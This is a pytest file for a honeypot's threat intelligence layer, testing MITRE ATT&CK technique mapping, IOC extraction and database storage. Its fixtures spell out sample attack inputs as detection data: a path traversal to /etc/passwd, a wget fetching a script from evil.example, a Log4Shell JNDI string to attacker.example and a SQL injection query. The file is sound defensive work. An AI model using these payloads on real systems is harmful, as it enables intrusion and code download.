"""Tests for the threat intelligence layer.

Covers:

* MITRE ATT&CK rule-based mapper (per-technique coverage, confidence,
  multi-technique events).
* IOC extractor (URLs, IPs, domains, hashes, emails, dedup, edge cases).
* Database persistence of attack mappings and IOCs.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from honeytrap.intel.attack_mapper import (
    TECHNIQUE_DB,
    ATTACKMapper,
    ATTACKMapping,
)
from honeytrap.intel.ioc_extractor import IOC, IOCExtractor
from honeytrap.logging.database import AttackDatabase
from honeytrap.logging.models import Event

# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def mapper() -> ATTACKMapper:
    return ATTACKMapper()


@pytest.fixture
def extractor() -> IOCExtractor:
    return IOCExtractor()


@pytest.fixture
def tmp_db(tmp_path: Path) -> AttackDatabase:
    db = AttackDatabase(tmp_path / "attacks.db")
    yield db
    db.close()


# ---------------------------------------------------------------------------
# Technique DB sanity
# ---------------------------------------------------------------------------


def test_technique_db_has_required_entries() -> None:
    required = {
        "T1190",
        "T1110",
        "T1110.001",
        "T1110.004",
        "T1059",
        "T1105",
        "T1135",
        "T1046",
        "T1078",
        "T1595.002",
    }
    assert required.issubset(TECHNIQUE_DB.keys())
    assert len(TECHNIQUE_DB) >= 15
    for key, entry in TECHNIQUE_DB.items():
        assert entry["id"] == key
        assert entry["name"]
        assert entry["tactic"]
        assert entry["description"]


def test_mapping_from_technique_parses_sub_id(mapper: ATTACKMapper) -> None:
    m = ATTACKMapping.from_technique("T1110.004", confidence=0.9, matched_on="unit")
    assert m.technique_id == "T1110"
    assert m.sub_technique_id == "T1110.004"
    assert m.tactic == "Credential Access"
    assert m.confidence == 0.9
    assert m.matched_on == "unit"

    top = ATTACKMapping.from_technique("T1190")
    assert top.technique_id == "T1190"
    assert top.sub_technique_id is None


# ---------------------------------------------------------------------------
# Mapper per-technique coverage
# ---------------------------------------------------------------------------


def test_http_path_traversal_maps_to_t1190(mapper: ATTACKMapper) -> None:
    event = {
        "protocol": "http",
        "event_type": "http_request",
        "path": "/../../etc/passwd",
        "message": "GET /../../etc/passwd",
        "user_agent": "curl/7.81.0",
    }
    result = mapper.map_event(event)
    ids = {m.technique_id for m in result}
    assert "T1190" in ids
    t1190 = next(m for m in result if m.technique_id == "T1190")
    assert t1190.confidence >= 0.8


def test_http_admin_panel_probe_maps(mapper: ATTACKMapper) -> None:
    event = {
        "protocol": "http",
        "event_type": "http_request",
        "path": "/wp-admin/admin-ajax.php",
    }
    result = mapper.map_event(event)
    assert any(m.technique_id == "T1190" for m in result)


def test_http_env_and_git_exposure_flagged(mapper: ATTACKMapper) -> None:
    event = {
        "protocol": "http",
        "event_type": "http_request",
        "path": "/.env",
    }
    result = mapper.map_event(event)
    ids = {m.technique_id for m in result}
    assert "T1190" in ids
    # Should also flag the credentials-in-files technique.
    sub_ids = {m.sub_technique_id for m in result}
    assert "T1552.001" in sub_ids


def test_ssh_brute_force_maps_t1110_001(mapper: ATTACKMapper) -> None:
    event = {
        "protocol": "ssh",
        "event_type": "auth_attempt",
        "username": "oracle",
        "password": "qwerty98",
    }
    result = mapper.map_event(event)
    sub_ids = {m.sub_technique_id for m in result}
    assert "T1110.001" in sub_ids
    # Uncommon password should NOT trigger credential stuffing.
    assert "T1110.004" not in sub_ids


def test_ssh_credential_stuffing_for_common_creds(mapper: ATTACKMapper) -> None:
    event = {
        "protocol": "ssh",
        "event_type": "auth_attempt",
        "username": "root",
        "password": "toor",
    }
    result = mapper.map_event(event)
    sub_ids = {m.sub_technique_id for m in result}
    assert "T1110.001" in sub_ids
    assert "T1110.004" in sub_ids


def test_ssh_shell_command_maps_t1059(mapper: ATTACKMapper) -> None:
    event = {
        "protocol": "ssh",
        "event_type": "shell_command",
        "message": "Command: uname -a",
    }
    result = mapper.map_event(event)
    assert any(m.technique_id == "T1059" for m in result)


def test_ssh_wget_triggers_ingress_tool_transfer(mapper: ATTACKMapper) -> None:
    event = {
        "protocol": "ssh",
        "event_type": "shell_command",
        "message": "Command: wget http://evil.example/bot.sh",
    }
    result = mapper.map_event(event)
    ids = {m.technique_id for m in result}
    assert "T1059" in ids
    assert "T1105" in ids


def test_telnet_mirai_creds_trigger_both_t1110_variants(mapper: ATTACKMapper) -> None:
    event = {
        "protocol": "telnet",
        "event_type": "auth_attempt",
        "username": "admin",
        "password": "admin",
    }
    result = mapper.map_event(event)
    sub_ids = {m.sub_technique_id for m in result}
    assert "T1110.001" in sub_ids
    assert "T1110.004" in sub_ids


def test_ftp_anonymous_login_maps_t1078(mapper: ATTACKMapper) -> None:
    event = {
        "protocol": "ftp",
        "event_type": "auth_attempt",
        "username": "anonymous",
        "password": "guest@example.com",
    }
    result = mapper.map_event(event)
    ids = {m.technique_id for m in result}
    assert "T1078" in ids
    assert "T1110" in ids


def test_smb_share_enum_maps_t1135(mapper: ATTACKMapper) -> None:
    event = {
        "protocol": "smb",
        "event_type": "share_enum",
        "message": "Listing shares",
    }
    result = mapper.map_event(event)
    assert any(m.technique_id == "T1135" for m in result)


def test_port_scan_maps_t1046(mapper: ATTACKMapper) -> None:
    event = {"protocol": "tcp", "event_type": "port_scan", "message": "rapid scan"}
    result = mapper.map_event(event)
    assert any(m.technique_id == "T1046" for m in result)


def test_sql_injection_maps_t1190(mapper: ATTACKMapper) -> None:
    event = {
        "protocol": "http",
        "event_type": "http_request",
        "path": "/search?q=' UNION SELECT password FROM users--",
    }
    result = mapper.map_event(event)
    assert any(m.technique_id == "T1190" and "sql-injection" in m.matched_on for m in result)


def test_log4shell_maps_t1190_high_confidence(mapper: ATTACKMapper) -> None:
    event = {
        "protocol": "http",
        "event_type": "http_request",
        "path": "/",
        "data": {"body": "${jndi:ldap://attacker.example/exploit}"},
    }
    result = mapper.map_event(event)
    t1190 = next(m for m in result if m.technique_id == "T1190")
    assert t1190.confidence >= 0.9
    assert "log4shell" in t1190.matched_on


def test_scanner_user_agent_maps_t1595(mapper: ATTACKMapper) -> None:
    for tool in ("sqlmap/1.6", "Mozilla/5.0 nikto", "nuclei/2.9", "gobuster/3"):
        event = {
            "protocol": "http",
            "event_type": "http_request",
            "path": "/",
            "user_agent": tool,
        }
        result = mapper.map_event(event)
        sub_ids = {m.sub_technique_id for m in result}
        assert "T1595.002" in sub_ids, f"scanner UA not flagged: {tool}"


def test_multi_technique_event_returns_all(mapper: ATTACKMapper) -> None:
    event = {
        "protocol": "http",
        "event_type": "http_request",
        "path": "/wp-admin/../../.env",
        "user_agent": "nikto/2.5",
    }
    result = mapper.map_event(event)
    assert len(result) >= 3
    ids = {m.technique_id for m in result}
    sub_ids = {m.sub_technique_id for m in result}
    assert "T1190" in ids
    assert "T1595.002" in sub_ids


def test_mapper_returns_empty_for_neutral_event(mapper: ATTACKMapper) -> None:
    event = {"protocol": "engine", "event_type": "startup", "message": "ok"}
    result = mapper.map_event(event)
    assert result == []


# ---------------------------------------------------------------------------
# IOC extractor
# ---------------------------------------------------------------------------


def test_extract_url_from_text(extractor: IOCExtractor) -> None:
    text = "attacker ran wget http://evil.example.com/bot.sh for payload"
    iocs = extractor.extract_from_text(text)
    urls = [i for i in iocs if i.type == "url"]
    assert urls and urls[0].value == "http://evil.example.com/bot.sh"


def test_extract_ipv4_skips_private(extractor: IOCExtractor) -> None:
    text = "curl 10.0.0.5 then contacted 203.0.113.42"
    iocs = extractor.extract_from_text(text)
    ip_values = {i.value for i in iocs if i.type == "ip"}
    assert "203.0.113.42" in ip_values
    assert "10.0.0.5" not in ip_values


def test_extract_domain_from_text(extractor: IOCExtractor) -> None:
    text = "c2 beacon to evil.example.co.uk every 30s"
    iocs = extractor.extract_from_text(text)
    domains = {i.value for i in iocs if i.type == "domain"}
    assert "evil.example.co.uk" in domains


def test_extract_email_from_text(extractor: IOCExtractor) -> None:
    text = "note from Badguy@Example.COM about exfil"
    iocs = extractor.extract_from_text(text)
    emails = [i for i in iocs if i.type == "email"]
    assert emails and emails[0].value == "badguy@example.com"


def test_extract_hashes(extractor: IOCExtractor) -> None:
    md5 = "d41d8cd98f00b204e9800998ecf8427e"
    sha1 = "da39a3ee5e6b4b0d3255bfef95601890afd80709"
    sha256 = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    text = f"captured hashes: {md5} {sha1} {sha256}"
    iocs = extractor.extract_from_text(text)
    hashes = {i.value for i in iocs if i.type == "hash"}
    assert md5 in hashes
    assert sha1 in hashes
    assert sha256 in hashes


def test_compute_hash_sha256(extractor: IOCExtractor) -> None:
    data = b"hello-honeytrap"
    digest = extractor.compute_hash(data)
    assert len(digest) == 64
    # Same content always hashes to same digest.
    assert digest == extractor.compute_hash(data)


def test_record_payload_creates_hash_ioc(extractor: IOCExtractor) -> None:
    ioc = extractor.record_payload(b"malware-dropper", context="ssh:upload")
    assert ioc.type == "hash"
    assert len(ioc.value) == 64
    assert extractor.by_type("hash")[0].value == ioc.value


def test_ioc_deduplication_across_calls(extractor: IOCExtractor) -> None:
    extractor.extract_from_text("hit http://bad.example/a")
    extractor.extract_from_text("hit http://bad.example/a")
    urls = extractor.by_type("url")
    assert len(urls) == 1


def test_ipv6_extraction_ignores_loopback(extractor: IOCExtractor) -> None:
    text = "ipv6 beacon to 2001:db8:abcd::1 ignoring ::1"
    iocs = extractor.extract_from_text(text)
    v6 = {i.value for i in iocs if i.type == "ipv6"}
    # At least one IPv6 value captured; loopback filtered.
    assert any(":" in v for v in v6)
    assert "::1" not in v6


def test_malformed_url_does_not_crash(extractor: IOCExtractor) -> None:
    # Should not raise on odd input.
    result = extractor.extract_from_text("ht!tp://not-a-url 3.3.3.3)")
    assert isinstance(result, list)


def test_extract_from_event_captures_host_header(extractor: IOCExtractor) -> None:
    event = {
        "protocol": "http",
        "event_type": "http_request",
        "remote_ip": "198.51.100.7",
        "user_agent": "curl/8.0",
        "path": "/",
        "data": {"host": "attacker.example:8080"},
        "session_id": "sess-1",
    }
    iocs = extractor.extract_from_event(event)
    values_by_type = {(i.type, i.value) for i in iocs}
    assert ("domain", "attacker.example") in values_by_type
    assert ("ip", "198.51.100.7") in values_by_type
    assert ("user_agent", "curl/8.0") in values_by_type


# ---------------------------------------------------------------------------
# Database persistence
# ---------------------------------------------------------------------------


def test_database_creates_new_tables(tmp_db: AttackDatabase) -> None:
    # The connection should already have attack_mappings + iocs tables.
    cur = tmp_db._conn.execute("SELECT name FROM sqlite_master WHERE type='table' ORDER BY name")
    names = {row[0] for row in cur.fetchall()}
    assert {"events", "attack_mappings", "iocs"}.issubset(names)


def test_record_attack_mapping_and_query(tmp_db: AttackDatabase) -> None:
    event = Event(
        protocol="ssh",
        event_type="auth_attempt",
        remote_ip="203.0.113.5",
        username="root",
        password="toor",
    )
    event_id = tmp_db.record_event(event)
    assert event_id is not None
    mapping = ATTACKMapping.from_technique("T1110.004", confidence=0.9)
    tmp_db.record_attack_mapping(event_id, mapping, remote_ip="203.0.113.5")
    top = tmp_db.get_top_techniques()
    assert top and top[0]["technique_id"] == "T1110"
    tactic_dist = tmp_db.get_tactic_distribution()
    assert tactic_dist and tactic_dist[0]["tactic"] == "Credential Access"


def test_record_ioc_dedup_increments_sightings(tmp_db: AttackDatabase) -> None:
    from datetime import datetime, timezone

    now = datetime.now(timezone.utc)
    ioc = IOC(type="url", value="http://evil.example/a", first_seen=now, last_seen=now)
    tmp_db.record_ioc(ioc)
    tmp_db.record_ioc(ioc)
    rows = tmp_db.get_iocs_by_type("url")
    assert len(rows) == 1
    assert rows[0]["sightings"] == 2

    summary = tmp_db.get_ioc_summary()
    assert any(s["type"] == "url" and s["sightings"] == 2 for s in summary)


def test_attack_timeline_ordered_newest_first(tmp_db: AttackDatabase) -> None:
    event = Event(protocol="http", event_type="http_request", remote_ip="1.2.3.4")
    for tid in ("T1190", "T1046", "T1595.002"):
        eid = tmp_db.record_event(event)
        assert eid is not None
        tmp_db.record_attack_mapping(eid, ATTACKMapping.from_technique(tid), remote_ip="1.2.3.4")
    timeline = tmp_db.get_attack_timeline()
    assert len(timeline) >= 3
    # Most recent insertion first: T1595.002 → but technique_id column stores parent.
    assert timeline[0]["technique_id"] in {"T1595", "T1595.002"}
